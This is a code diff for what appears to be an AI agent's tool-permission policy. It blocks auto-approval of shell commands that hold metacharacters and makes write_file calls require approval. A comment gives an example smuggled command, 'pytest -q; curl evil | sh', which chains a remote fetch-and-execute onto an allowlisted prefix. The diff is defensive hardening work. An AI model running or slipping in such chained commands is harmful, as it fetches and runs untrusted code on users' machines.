@@ -27,9 +27,26 @@
       (define path (call-path call))
       (if (eqv? path :null) #f (string-prefix? path prefix)))))
 
+; Shell metacharacters that would let an allowlisted prefix smuggle a second
+; command past the check: "pytest -q; curl evil | sh" starts with "pytest "
+; but is not a pytest invocation. command-is? refuses to auto-allow any
+; command containing one — such commands fall through to :ask, not :deny.
+(define command-has-shell-metacharacter?
+  (lambda (command)
+    (or? (string-contains? command ";")
+         (string-contains? command "&")
+         (string-contains? command "|")
+         (string-contains? command "`")
+         (string-contains? command "$(")
+         (string-contains? command ">")
+         (string-contains? command "<")
+         (string-contains? command "\n"))))
+
 ; Command allowlist: the shell :command is `allowed` itself or `allowed`
 ; followed by arguments — "pytest" matches "pytest" and "pytest -q x",
-; never "pytest-evil".
+; never "pytest-evil", and never a command line carrying shell
+; metacharacters (; & | ` $( > < newline), which would chain extra commands
+; onto the allowlisted one.
 ;   ((command-is? call "pytest") :allow)
 (define command-is?
   (lambda (call allowed)
@@ -37,8 +54,10 @@
       (define command (call-command call))
       (if (eqv? command :null)
           #f
-          (or? (equal? command allowed)
-               (string-prefix? command (String.concat allowed " ")))))))
+          (if (command-has-shell-metacharacter? command)
+              #f
+              (or? (equal? command allowed)
+                   (string-prefix? command (String.concat allowed " "))))))))
 
 ; One-line description of a tool call, for approval prompts and the trace.
 (define describe-tool-call
@@ -55,6 +74,11 @@
                  (String.concat "\n  - "
                    (String.concat (plist-get input :old_string)
                      (String.concat "\n  + " (plist-get input :new_string)))))))
+            ((equal? name "write_file")
+             ; The full arriving content, as an all-additions diff.
+             (String.concat "write_file: "
+               (String.concat (plist-get input :path)
+                 (String.concat "\n  + " (plist-get input :content)))))
             (#t name)))))
 
 ; The default policy: reads are free, writes and shell ask first. MCP tools
@@ -67,6 +91,7 @@
       (define name (plist-get call :name))
       (cond ((equal? name "shell") :ask)
             ((equal? name "edit_file") :ask)
+            ((equal? name "write_file") :ask)
             ((equal? name "read_file") :allow)
             ((equal? name "list_dir") :allow)
             ((equal? name "file_tree") :allow)
